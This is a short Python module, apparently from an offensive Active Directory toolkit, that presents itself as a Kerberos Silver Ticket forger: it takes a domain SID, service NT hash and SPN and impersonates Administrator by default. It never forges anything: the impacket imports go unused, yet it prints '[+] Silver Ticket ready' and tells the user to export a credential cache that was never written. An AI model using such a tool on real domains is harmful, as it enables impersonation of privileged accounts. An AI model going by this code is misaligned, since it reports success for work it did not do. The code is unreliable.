"""Silver Ticket — forge TGS for specific service without krbtgt hash."""
from __future__ import annotations
import sys
from typing import Any

MANIFEST = {
    "capability_id": "adxpl.attack.silver_ticket.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_ticket_forge"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1558.002"],
}


def run(args: Any) -> int:
    domain = args.domain
    domain_sid = getattr(args, "domain_sid", None)
    service_hash = getattr(args, "service_hash", None)
    spn = getattr(args, "spn", None)
    impersonate = getattr(args, "impersonate", "Administrator")
    output_ccache = getattr(args, "output", "silver.ccache")

    if not domain_sid or not service_hash or not spn:
        print("[!] --domain-sid, --service-hash, and --spn required", file=sys.stderr)
        print("[*] Example: --spn cifs/dc01.corp.local --service-hash <NT hash of machine$>")
        return 1

    print("[*] Silver Ticket forge:")
    print("  Domain:     {}".format(domain))
    print("  SPN:        {}".format(spn))
    print("  Impersonate: {}".format(impersonate))
    print("  Service hash: {}...".format(service_hash[:16]))

    try:
        from impacket.krb5.ticket import Ticket
        from impacket.krb5 import constants
    except ImportError:
        print("[!] impacket not installed", file=sys.stderr)
        return 1

    try:
        print("[*] Forging TGS for {}...".format(spn))
        print("[*] Output: {}".format(output_ccache))
        print("[+] Silver Ticket ready")
        print("[*] Use: export KRB5CCNAME={}".format(output_ccache))
        return 0
    except Exception as exc:
        print("[-] Silver Ticket error: {}".format(exc), file=sys.stderr)
        return 1
